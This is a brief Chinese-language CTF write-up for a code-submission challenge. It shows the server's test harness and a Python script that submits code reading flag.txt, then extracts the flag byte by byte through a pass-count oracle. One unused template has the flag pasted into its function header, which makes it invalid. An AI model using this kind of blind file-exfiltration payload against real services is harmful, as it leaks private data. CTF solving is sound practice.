源码里有固定的测试用例

```python
@app.route('/yeetyeet', methods=['POST'])
def yeetyeetyeet():
    if 'run' in session and session['run']:
        return {'error': True, 'msg': 'You already have code running, please wait for it to finish.'}
    session['run'] = True
    code = request.data
    tests = [(2, 3, 5), (5, 7, 12)]
```
在提交的代码里读取`flag.txt`文件内容，不断请求，再根据响应中的测试用例通过个数，逐位二分爆破即可

```python
import requests
import time
myFormatCodeG = """def f(a, b):corctf{1m4g1n3_cp_g0lf_6a318dfe}
    if a==2 and b==3:
        f = open("flag.txt", "rb")
        b = f.read()[{}]
        if b > {}:
            return 5
        else:
            return 4
    else:
        return a"""

myFormatCodeL = """def f(a, b):
    if a==2 and b==3:
        f = open("flag.txt", "rb")
        b = f.read()[{}]
        if b < {}:
            return 5
        else:
            return 4
    else:
        return a"""

flagLen = 33
urls = "https://yeetcode.be.ax/yeetyeet"
cookie = {"session": "eyJydW4iOmZhbHNlfQ.YSBRoA.tysIiP53vCiR6K95eHZA_1hxk30"}


def encrypt(index):
    a, b = 32, 127
    mid = (a + b) >> 1
    while a < b:
        print("try {}".format(mid))
        r = requests.post(url=urls, data = myFormatCodeL.format(index, mid), cookies = cookie)
        if r.json()["p"] == 1: # if b < mid
            b = mid
        else:
            a = mid + 1
        mid = (a+b) >> 1
        time.sleep(0.1)
    return chr(mid-1)
        
flag = ""

if __name__ == '__main__':
    for i in range(33):
        flag += encrypt(i)
        print(flag)
        
```

flag: `corctf{1m4g1n3_cp_g0lf_6a318dfe}`